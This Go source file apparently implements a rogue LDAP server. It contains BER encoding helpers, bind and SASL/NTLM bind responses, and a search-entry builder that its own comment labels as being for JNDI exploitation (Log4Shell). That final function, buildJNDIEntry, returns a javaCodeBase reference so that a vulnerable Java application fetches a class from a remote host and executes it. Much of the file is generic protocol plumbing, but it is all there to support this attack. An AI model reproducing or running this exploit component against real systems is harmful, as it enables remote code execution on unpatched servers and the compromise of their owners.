package ldapserver

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
)

// BER tag constants
const (
	tagInteger     = 0x02
	tagOctetString = 0x04
	tagEnum        = 0x0a
	tagSequence    = 0x30
	tagSet         = 0x31
	tagBindReq     = 0x60 // [APPLICATION 0] constructed
	tagBindResp    = 0x61 // [APPLICATION 1] constructed
	tagUnbindReq   = 0x42 // [APPLICATION 2] primitive
	tagSearchReq   = 0x63 // [APPLICATION 3] constructed
	tagSearchEntry = 0x64 // [APPLICATION 4] constructed
	tagSearchDone  = 0x65 // [APPLICATION 5] constructed
	tagCtxPrim0    = 0x80 // context [0] primitive — simple auth password
	tagCtxCons3    = 0xa3 // context [3] constructed — SASL (RFC 4511)
	tagCtxPrim9    = 0x89 // context [9] primitive — Microsoft proprietary NTLM bind
)

// readBERLength reads a BER-encoded length from r.
func readBERLength(r io.Reader) (int, error) {
	var b [1]byte
	if _, err := io.ReadFull(r, b[:]); err != nil {
		return 0, err
	}
	if b[0]&0x80 == 0 {
		return int(b[0]), nil
	}
	n := int(b[0] & 0x7f)
	if n == 0 || n > 4 {
		return 0, fmt.Errorf("unsupported BER length: %d extra bytes", n)
	}
	buf := make([]byte, 4)
	if _, err := io.ReadFull(r, buf[4-n:]); err != nil {
		return 0, err
	}
	return int(binary.BigEndian.Uint32(buf)), nil
}

// readTLV reads one BER TLV element and returns its tag and value bytes.
func readTLV(r io.Reader) (tag byte, val []byte, err error) {
	var t [1]byte
	if _, err = io.ReadFull(r, t[:]); err != nil {
		return
	}
	tag = t[0]
	l, e := readBERLength(r)
	if e != nil {
		return 0, nil, e
	}
	val = make([]byte, l)
	_, err = io.ReadFull(r, val)
	return
}

// asInt interprets big-endian bytes as an integer.
func asInt(b []byte) int {
	v := 0
	for _, c := range b {
		v = (v << 8) | int(c)
	}
	return v
}

// encLen encodes an integer as a BER length field.
func encLen(n int) []byte {
	switch {
	case n < 128:
		return []byte{byte(n)}
	case n < 256:
		return []byte{0x81, byte(n)}
	default:
		return []byte{0x82, byte(n >> 8), byte(n)}
	}
}

// tlv constructs a BER TLV element.
func tlv(tag byte, val []byte) []byte {
	out := make([]byte, 0, 1+len(encLen(len(val)))+len(val))
	out = append(out, tag)
	out = append(out, encLen(len(val))...)
	out = append(out, val...)
	return out
}

func cat(slices ...[]byte) []byte {
	var buf bytes.Buffer
	for _, s := range slices {
		buf.Write(s)
	}
	return buf.Bytes()
}

func berSeq(children ...[]byte) []byte  { return tlv(tagSequence, cat(children...)) }
func berSet(children ...[]byte) []byte  { return tlv(tagSet, cat(children...)) }
func berStr(s string) []byte            { return tlv(tagOctetString, []byte(s)) }
func berEnum(v int) []byte              { return tlv(tagEnum, []byte{byte(v)}) }
func berInt(v int) []byte {
	if v >= 0 && v <= 127 {
		return tlv(tagInteger, []byte{byte(v)})
	}
	return tlv(tagInteger, []byte{byte(v >> 8), byte(v)})
}

// buildBindResponse constructs an LDAP BindResponse with resultCode 0 (success).
func buildBindResponse(msgID int) []byte {
	resp := tlv(tagBindResp, cat(berEnum(0), berStr(""), berStr("")))
	return berSeq(berInt(msgID), resp)
}

// buildSASLBindResponse constructs an LDAP BindResponse with optional serverSaslCreds.
// Use resultCode 14 (saslBindInProgress) for NTLM round 1, 0 for round 2.
func buildSASLBindResponse(msgID, resultCode int, saslCreds []byte) []byte {
	content := cat(berEnum(resultCode), berStr(""), berStr(""))
	if len(saslCreds) > 0 {
		content = cat(content, tlv(0x87, saslCreds)) // [7] IMPLICIT OCTET STRING — serverSaslCreds
	}
	resp := tlv(tagBindResp, content)
	return berSeq(berInt(msgID), resp)
}

// buildSearchDone constructs an LDAP SearchResultDone with the given result code.
func buildSearchDone(msgID, code int) []byte {
	done := tlv(tagSearchDone, cat(berEnum(code), berStr(""), berStr("")))
	return berSeq(berInt(msgID), done)
}

// buildJNDIEntry constructs a SearchResultEntry for JNDI exploitation (Log4Shell).
// The target JVM will fetch className+".class" from codeBase and execute it.
func buildJNDIEntry(msgID int, dn, className, codeBase string) []byte {
	attrs := tlv(tagSequence, cat(
		berSeq(berStr("javaClassName"), berSet(berStr(className))),
		berSeq(berStr("javaCodeBase"), berSet(berStr(codeBase))),
		berSeq(berStr("objectClass"), berSet(berStr("javaNamingReference"))),
		berSeq(berStr("javaFactory"), berSet(berStr(className))),
	))
	entry := tlv(tagSearchEntry, cat(berStr(dn), attrs))
	return berSeq(berInt(msgID), entry)
}
